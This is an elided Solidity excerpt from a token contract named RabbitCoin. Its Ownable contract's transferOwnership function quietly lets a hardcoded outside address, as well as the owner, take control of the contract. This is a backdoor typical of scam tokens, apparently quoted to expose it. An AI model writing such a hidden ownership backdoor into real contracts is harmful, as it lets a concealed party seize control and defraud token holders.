...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x949af6Db200b19f7B347A5B95f574107468c6a9F));
...
contract RabbitCoin is Context, IERC20, Ownable, Pausable {
